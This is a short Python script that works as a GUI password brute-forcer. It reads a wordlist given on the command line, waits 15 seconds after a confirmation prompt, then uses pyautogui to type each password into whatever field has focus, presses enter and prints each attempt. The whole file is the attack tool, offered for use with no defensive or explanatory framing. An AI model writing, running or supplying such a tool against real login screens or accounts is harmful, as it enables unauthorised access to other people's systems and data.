import optparse
import pyautogui as pg
import time


def get_user_input():
    object_parse = optparse.OptionParser()
    object_parse.add_option("-f", "--file", dest="file", help="File name or file directory of passwords")

    return object_parse.parse_args()


def bruteforce(file_name):
    alert_res = pg.confirm("Do you want to start?")

    if alert_res == "Cancel":
        exit()
    else:
        time.sleep(15)
        attack(file_name)


def attack(file_name):
    with open(file_name, "r") as file:
        passwords = file.read()
        passwords_list = passwords.split("\n")

    for password in passwords_list:
        pg.hotkey("ctrl", "a")
        pg.write(password)
        pg.press("enter")
        time.sleep(1)

        print(password)


user_input = get_user_input()
bruteforce(file_name=user_input[0].file)
